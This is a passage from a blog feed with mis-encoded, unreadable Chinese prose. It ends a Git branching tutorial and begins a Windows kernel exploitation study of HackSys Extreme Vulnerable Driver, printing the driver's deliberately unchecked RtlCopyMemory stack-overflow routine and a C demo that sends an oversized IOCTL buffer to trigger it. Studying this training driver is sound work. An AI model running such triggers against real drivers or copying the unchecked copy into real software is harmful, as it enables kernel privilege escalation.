é™¤äº†è¿™ä¸ªç›®å½•ï¼Œæœ¬åœ°ä»“åº“åŠå…¶ç›¸å…³ä¿¡æ¯éƒ½ä¼šæ¶ˆå¤±ã€‚</li><li>å·¥ä½œåŒºå’Œç‰ˆæœ¬åº“<br>è¿™é‡Œçš„å·¥ä½œåŒºæŒ‡çš„æ˜¯ä¸åŒ…æ‹¬.gitç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä½ å¯ä»¥å¯¹å·¥ä½œåŒºè¿›è¡Œä»»æ„çš„ä¿®æ”¹ï¼Œéƒ½ä¸ä¼šå½±å“åˆ°æœ¬åœ°çš„ä»“åº“ã€‚<br>.gitç›®å½•æ˜¯æœ¬åœ°ä»“åº“ï¼Œä¹Ÿå«ä½œç‰ˆæœ¬åº“ã€‚ç‰ˆæœ¬åº“å¯ä»¥ç²—ç•¥çš„åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†â€”â€”æš‚å­˜åŒºå’Œåˆ†æ”¯åŒºï¼Œè¿™ä¸¤ä¸ªåŒºåŸŸæ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚<br>æˆ‘ä»¬ä½¿ç”¨â€œgit addâ€å‘½ä»¤æŠŠå·¥ä½œåŒºçš„æ–‡ä»¶ä¿®æ”¹æ·»åŠ åˆ°æš‚å­˜åŒºï¼Œä½¿ç”¨â€œgit commitâ€å‘½ä»¤æŠŠæš‚å­˜åŒºçš„æ–‡ä»¶ä¿®æ”¹æäº¤åˆ°å½“å‰åˆ†æ”¯ã€‚å¦‚ä¸‹é¢ä¸¤å¹…å›¾ï¼Œæš‚å­˜åŒºè¯‘ä¸ºstageã€‚</li><li><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/working-for-git-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/working-for-git-01.png"></a></li><li>æš‚å­˜åŒºæ˜¯Gitéå¸¸é‡è¦çš„ç‰¹æ€§ï¼Œéœ€è¦ä»”ç»†ç†è§£ã€‚</li><li>åˆ†æ”¯<br>æ¯æ¬¡æäº¤ï¼ŒGitéƒ½æŠŠå®ƒä»¬ä¸²æˆä¸€æ¡æ—¶é—´çº¿ï¼Œè¿™æ¡æ—¶é—´çº¿å°±æ˜¯ä¸€ä¸ªåˆ†æ”¯ã€‚å½“åªæœ‰ä¸€ä¸ªåˆ†æ”¯æ—¶ï¼Œè¿™ä¸ªåˆ†æ”¯å«ä¸»åˆ†æ”¯ï¼Œå³masteråˆ†æ”¯ã€‚<br>ä¸€å¼€å§‹çš„æ—¶å€™ï¼Œmasteråˆ†æ”¯æ˜¯ä¸€æ¡çº¿ï¼ŒGitè®©masteræŒ‡å‘æœ€æ–°çš„æäº¤ï¼Œå†ç”¨HEADæŒ‡å‘masterï¼Œå°±èƒ½ç¡®å®šå½“å‰åˆ†æ”¯ï¼Œä»¥åŠå½“å‰åˆ†æ”¯çš„æäº¤ç‚¹ã€‚æ¯æ¬¡æäº¤ï¼Œmasteråˆ†æ”¯éƒ½ä¼šå‘å‰ç§»åŠ¨ä¸€æ­¥ï¼Œè¿™æ ·ï¼Œéšç€ä½ ä¸æ–­æäº¤ï¼Œmasteråˆ†æ”¯çš„çº¿ä¹Ÿè¶Šæ¥è¶Šé•¿</li></ul><h1 id="å¼€å‘å…·ä½“å‘½ä»¤ä»¥åŠæ–¹æ³•"><a href="#å¼€å‘å…·ä½“å‘½ä»¤ä»¥åŠæ–¹æ³•" class="headerlink" title="å¼€å‘å…·ä½“å‘½ä»¤ä»¥åŠæ–¹æ³•"></a>å¼€å‘å…·ä½“å‘½ä»¤ä»¥åŠæ–¹æ³•</h1><p>å·¥ä½œæµç¨‹</p><ul><li>å…‹éš†é¡¹ç›®</li><li>ç­¾å‡ºdev åˆ†æ”¯ã€‚</li><li>åœ¨devåˆ†æ”¯åŸºç¡€ä¸Šåˆ›å»ºè‡ªå·±çš„åˆ†æ”¯ member* ã€‚</li><li>åœ¨è‡ªå·±çš„åˆ†æ”¯ä¸Šæ·»åŠ æ–‡ä»¶</li><li>åœ¨è‡ªå·±çš„åˆ†æ”¯ä¸Šä¿®æ”¹æ–‡ä»¶</li><li>åˆå¹¶åˆ°devåˆ†æ”¯</li><li>æ¨é€æœ¬åœ°devåˆ†æ”¯åˆ°è¿œç¨‹devåˆ†æ”¯<br>å‘½ä»¤</li><li>ä¿®æ”¹è‡ªå·±æœ¬åœ°çš„gitçš„ç”¨æˆ·åå’Œé‚®ç®±è®¾ç½®<br>å°†è‡ªå·±æœ¬åœ°çš„gitçš„ç”¨æˆ·åå’Œé‚®ç®±è®¾ç½®çš„ä¸githubç›¸åŒï¼Œå¦åˆ™ä½ æ¨é€ä¹‹åæ˜¾ç¤ºçš„æ˜¯åˆ«äººæ¨é€çš„qwqã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name aaa</span><br><span class="line">$ git config --global user.email aaa@aaa.com</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li>è®¾ç½®æœ¬åœ°ä»“åº“<br>è¿™ä¸€æ­¥å…‹éš†åˆ†æ”¯åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”åˆ‡æ¢åˆ°devåˆ†æ”¯ï¼Œéšåå»ºç«‹è‡ªå·±çš„åˆ†æ”¯ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd [é¡¹ç›®è·¯å¾„] </span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;FlappyPig&#x2F;pigcrypto  </span><br><span class="line">$ git checkout dev</span><br><span class="line">$ git checkout -b [MEMBER_NAME]  # [MEMBER_NAME] æ˜¯è‡ªå·±çš„åˆ†æ”¯åç§°</span><br><span class="line"></span><br></pre></td></tr></table></figure>git checkoutçš„-bå‚æ•°è¡¨ç¤ºæ–°å»ºåˆ†æ”¯ï¼Œæ— å‚æ•°è¡¨ç¤ºåˆ‡æ¢åˆ°ç°æœ‰åˆ†æ”¯ã€‚</li><li>æ›´æ–°æœ¬åœ°ä»“åº“<br>åœ¨è¿™ä¸€æ­¥è¿›è¡Œä»£ç çš„å¼€å‘ï¼Œé˜¶æ®µæ€§å¼€å‘å®Œæˆåå°†ä»£ç æ·»åŠ åˆ°æœ¬åœ°ä»“åº“ï¼Œæ³¨æ„æäº¤æ³¨é‡Šå†™çš„å°½é‡å…·ä½“ï¼Œaddå’Œcommitçš„ä½œç”¨åœ¨ç¬¬ä¸€èŠ‚è¯´æ˜äº†ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git add .  #è¿™é‡Œå¯ä»¥åˆ—å‡ºå…·ä½“è¦æ·»åŠ çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨.æ·»åŠ æ‰€æœ‰æ–°å¢æ–‡ä»¶</span><br><span class="line">$ git commit -m &quot;æäº¤æ³¨é‡Š&quot;</span><br></pre></td></tr></table></figure></li><li>må‚æ•°åæ¥æ³¨é‡Šï¼Œæ³¨é‡Šå°½é‡å†™è‹±æ–‡å§233</li><li>å°†è‡ªå·±çš„åˆ†æ”¯åˆå¹¶åˆ°æœ¬åœ°devåˆ†æ”¯<br>æœ¬æ­¥æ˜¯åœ¨é˜¶æ®µæ€§å¼€å‘å®Œæˆåï¼Œå°†è‡ªå·±çš„åˆ†æ”¯åˆå¹¶åˆ°æœ¬åœ°devåˆ†æ”¯ï¼Œå‡†å¤‡æ¨é€åˆ°è¿œç¨‹ã€‚è‡ªå·±çš„åˆ†æ”¯å¼€å‘å®Œæˆåï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ‡æ¢å›devåˆ†æ”¯ï¼Œéšåå°†è‡ªå·±åˆ†æ”¯çš„ä¿®æ”¹åˆå¹¶åˆ°devåˆ†æ”¯ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout dev</span><br><span class="line">$ git merge --no-ff [MEMBER_NAME] -m &quot;æäº¤æ³¨é‡Š&quot;  # [MEMBER_NAME] æ˜¯è‡ªå·±çš„åˆ†æ”¯åç§°</span><br></pre></td></tr></table></figure></li><li>-no-ffå‚æ•°è¡¨ç¤ºå¼ºåˆ¶ç”Ÿæˆmergeæ—¥å¿—ã€‚</li><li>å°†æœ¬åœ°devåˆ†æ”¯æ¨é€åˆ°è¿œç¨‹<br><code>$ git push</code><br>ä½¿ç”¨è¯¥å‘½ä»¤ä¹‹å‰æ³¨æ„è‡ªå·±çš„æœ¬åœ°åˆ†æ”¯æ˜¯å¦åœ¨devä¹‹ä¸‹ï¼ˆgit statusæŸ¥çœ‹ï¼‰ã€‚</li></ul><p>å¦‚æœåœ¨æ¨é€è¿‡ç¨‹ä¸­æç¤ºä¸è¿œç¨‹devåˆ†æ”¯å‘ç”Ÿå†²çªï¼Œéœ€è¦å…ˆå°†è¿œç¨‹devåˆ†æ”¯åŒæ­¥åˆ°æœ¬åœ°ï¼Œè§£å†³å†²çªåå†æ¨é€ï¼Œå¹³æ—¶å°½é‡é¿å…ä¸åŒå¼€å‘äººå‘˜ä¿®æ”¹åŒä¸€ä¸ªæ–‡ä»¶ã€‚<br>å¤„ç†ä»£ç å¦‚ä¸‹ï¼Œé¦–å…ˆæˆ‘ä»¬ä½¿ç”¨pullå‘½ä»¤åŒæ­¥è¿œç¨‹ä»“åº“åˆ°æœ¬åœ°ï¼Œæ­¤æ—¶gitä¼šæç¤ºä½ å¤„ç†å†²çªï¼Œå¤„ç†å®Œæˆåä¿å­˜æ–‡ä»¶ã€‚å†ä½¿ç”¨addå‘½ä»¤æ·»åŠ å¤„ç†å®Œçš„æ–‡ä»¶ï¼Œéšåcommitæäº¤æœ¬æ¬¡å†²çªå¤„ç†ï¼Œç„¶åå†å»pushã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git push </span><br><span class="line">       #                                               # é‡åˆ°é”™è¯¯</span><br><span class="line">$ git pull</span><br><span class="line">       # â€¦                                               # è§£å†³å†²çª</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .  #æ·»åŠ ä¿®æ”¹åçš„æ–‡ä»¶åˆ°æœ¬åœ°ä»“åº“</span><br><span class="line">$ git commit -m &quot;solve conflict:ç”±äºXXåŸå› å‡ºé”™ï¼Œä¿®æ”¹XXæ–‡ä»¶è§£å†³é—®é¢˜&quot;</span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure><ul><li>åˆ é™¤è‡ªå·±çš„åˆ†æ”¯ï¼ˆå¯é€‰ï¼‰<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -d [MEMBER_NAME]  # [MEMBER_NAME] æ˜¯è‡ªå·±çš„åˆ†æ”¯åç§°</span><br></pre></td></tr></table></figure>è‡ªå·±çš„æœ¬åœ°åˆ†æ”¯çš„å­˜åœ¨ä¸ä¼šå½±å“è¿œç¨‹åˆ†æ”¯ã€‚</li><li>å¸¸ç”¨æŸ¥è¯¢å‘½ä»¤<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git branch                          # æŸ¥çœ‹è‡ªå·±æ‰€åœ¨åˆ†æ”¯ ä»¥åŠè‡ªå·±æ‰€æ‹¥æœ‰çš„åˆ†æ”¯</span><br><span class="line">$ git log --graph                      # æŸ¥çœ‹è‡ªå·±çš„æäº¤è®°å½•</span><br><span class="line">$ git reflog                                            # æŸ¥çœ‹è‡ªå·±çš„æ“ä½œå†å²</span><br><span class="line">$ git status                                        # æŸ¥çœ‹æœ¬åœ°ä»“åº“å½“å‰çš„æ–‡ä»¶çŠ¶æ€</span><br><span class="line">$ git blame [FILE_PATH]                  # æŸ¥çœ‹æ–‡ä»¶çš„æ¯ä¸€éƒ¨åˆ†æœ€åç”±è°æ”¹åŠ¨</span><br></pre></td></tr></table></figure></li></ul></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Kernel Exploit Study(1)</title>
      <link href="Windows-Kernel-Exploit-Study-1.html"/>
      <url>Windows-Kernel-Exploit-Study-1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>ä¹‹å‰åœ¨ä¸€ä¸ªå°ç¾¤é‡Œjokerå¸ˆå‚…ç»™å¤§å®¶æ¨èäº†ä¸€æ³¢<a href="http://www.hacking-training.com/download/WKE.pdf">Windows Kernel Exploit</a>ï¼Œè¿™ä¸ªå…¥é—¨çº§çš„windows kernel pwnçš„èµ„æ–™ï¼Œæ­£å¥½è·Ÿç€å­¦ä¹ ä¸€ä¸‹å†…æ ¸ç›¸å…³çš„çŸ¥è¯†ã€‚</p><h4 id="0x01-ç¯å¢ƒ"><a href="#0x01-ç¯å¢ƒ" class="headerlink" title="0x01: ç¯å¢ƒ"></a>0x01: ç¯å¢ƒ</h4><ol><li>æ‰€ç”¨ç³»ç»Ÿè¯´æ˜</li></ol><pre><code>ç‰©ç†æœº ï¼šwindows10è™šæ‹Ÿæœº ï¼šxp sp3 cn</code></pre><ol start="2"><li>è¿‡ç¨‹ä¸­ç”¨åˆ°çš„å·¥å…·</li></ol><pre><code>Visual Studio 2010WindbgProcessExplorerosrloaderv30</code></pre><h4 id="0x02-å‰æœŸå‡†å¤‡"><a href="#0x02-å‰æœŸå‡†å¤‡" class="headerlink" title="0x02: å‰æœŸå‡†å¤‡"></a>0x02: å‰æœŸå‡†å¤‡</h4><p>é¦–å…ˆæ˜¯åŒæœºè°ƒè¯•å’Œé©±åŠ¨åŠ è½½çš„é—®é¢˜ã€‚<br>åŒæœºè°ƒè¯•çš„è¯ï¼Œé¦–å…ˆä¿®æ”¹xpçš„boot.iniæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åœ¨ï¼š<code>C:\boot.ini</code>ã€‚æ·»åŠ è°ƒè¯•ç›¸å…³çš„é€‰é¡¹ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ç›´æ¥åŠ äº†ä¸€ä¸ªå¯åŠ¨é¡¹ï¼Œå¦‚å›¾ï¼š<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/bootini_conf.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/bootini_conf.png"></a><br>ç„¶ååœ¨vmwareé‡Œç»™xpè™šæ‹ŸæœºåŠ ä¸€ä¸ªä¸²å£å°±å¯ä»¥äº†ï¼Œé…ç½®å¦‚ä¸‹å›¾ï¼š<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/vm_pipe.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/vm_pipe.png"></a><br>ç„¶åï¼Œè¿›å…¥windbgï¼Œé€‰æ‹©ï¼šFileâ€“Kernel Debugï¼Œé€‰ä¸­COMæ ï¼Œå¡«å†™ç›¸åº”çš„ç®¡é“çš„ä¿¡æ¯ï¼Œç„¶åå°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/windbg_pipe.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/windbg_pipe.png"></a></p><p>æƒ³è¦æ–­ä¸‹æ¥ç„¶åå•æ­¥å¯ä»¥ç›´æ¥ï¼šDebugâ€”â€”â€”Breakï¼Œè¿™æ ·å°±å¯ä»¥æ–­ä¸‹æ¥äº†ã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/dbg_view.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/dbg_view.png"></a><br>ä¹‹åä½¿ç”¨<code>osrloaderv30</code>å·¥å…·å»åŠ è½½ç›®æ ‡é©±åŠ¨ã€‚<br><a href="http://blogimg-10065924.cos.myqcloud.com/WKE1/sys_loaded.png" class="gallery-item"><img src="http://blogimg-10065924.cos.myqcloud.com/WKE1/sys_loaded.png"></a></p><h4 id="0x03-åˆ†æ"><a href="#0x03-åˆ†æ" class="headerlink" title="0x03: åˆ†æ"></a>0x03: åˆ†æ</h4><p>å¼€å§‹åªæ˜¯å‡†å¤‡å°è¯•ä¸‹æœ€ç®€å•çš„Stackoverflow vulnå»ææƒï¼Œå…³äºè¿™éƒ¨åˆ†ï¼Œé©±åŠ¨çš„æºç å¦‚ä¸‹ï¼š<br>è¿™é‡Œåªè´´å‡ºæ¥æ´¾é£ä¾‹ç¨‹éƒ¨åˆ†çš„ä»£ç ï¼Œæ¼æ´å¾ˆæ˜æ˜¾ï¼Œå†…æ ¸é‡Œç›´æ¥ä½¿ç”¨äº†ç”¨æˆ·å±‚ä¼ è¿›æ¥çš„sizeè¿›è¡Œæ‹·è´å·¥ä½œï¼Œè€Œæ²¡æœ‰åšä»»ä½•çš„checkï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">TriggerStackOverflow</span><span class="params">(IN PVOID UserBuffer, IN SIZE_T Size)</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(KernelBuffer));</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Stack Overflow\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªdemoå»è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œç„¶åä½¿ç”¨Tokenæ›¿æ¢çš„æ€è·¯å»ææƒã€‚<br>æ ¹æ®<a href="http://www.hacking-training.com/download/WKE.pdf">WEK.pdf</a>çš„ä¾‹ç¨‹ï¼Œdemoå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bof_demo.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)</span></span><br><span class="line"><span class="comment">//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc,_TCHAR* argv[])&#123;</span><br><span class="line"></span><br><span class="line">DWORD lpBytesReturned;</span><br><span class="line">PVOID pMemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">PULONG lpInBuffer = <span class="literal">NULL</span>;</span><br><span class="line">LPCSTR lpDeviceName = (LPCSTR) <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>;</span><br><span class="line">SIZE_T nInBufferSize = <span class="number">768</span> * <span class="keyword">sizeof</span>(ULONG);</span><br><span class="line"><span class="comment">//SIZE_T nInBufferSize = 1024 * sizeof(ULONG);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Getting the device handle\r\n&quot;</span>);</span><br><span class="line">HANDLE hDriver = CreateFileA(lpDeviceName,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Failed to get device handle : (0x%X\r\n)&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Got the device Handle : 0x%X\r\n&quot;</span>, hDriver);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Allocating Memory For Input Buffer\r\n&quot;</span>);</span><br><span class="line">lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!lpInBuffer) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]HeapAlloc failed :(0x%X\r\n)&quot;</span>,GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Input buffer allocated as 0x%X bytes.\r\n&quot;</span>,nInBufferSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Input buffer address : 0x%p\r\n&quot;</span>,lpInBuffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Filling buffer with A&#x27;s\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//char *data = &quot;junk for get bof length....&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//memcpy(lpInBuffer,data,nInBufferSize);</span></span><br><span class="line"></span><br><span class="line">RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, <span class="number">0x41</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Send IOCTL request\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">DeviceIoControl(hDriver,</span><br><span class="line">HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">(LPVOID)lpInBuffer,</span><br><span class="line">(DWORD)nInBufferSize,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">&amp;lpBytesReturned,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]IOCTL request completed,cleaning up da heap.\r\n&quot;</span>);</span><br><span class="line">HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)lpInBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¹Ÿå¾ˆç®€å•ï¼Œè‡ªå®šä¹‰çš„bufferå’Œsizeï¼Œç„¶åä¼ é€’ç»™ç›®æ ‡é©±åŠ¨çš„Stackoverflowçš„æ´¾é£ä¾‹ç¨‹ã€‚</p><h4 id="0x04-è¿‡ç¨‹"><a href="#0x04-è¿‡ç¨‹" class="headerlink" title="0x04: è¿‡ç¨‹"></a>0x04: 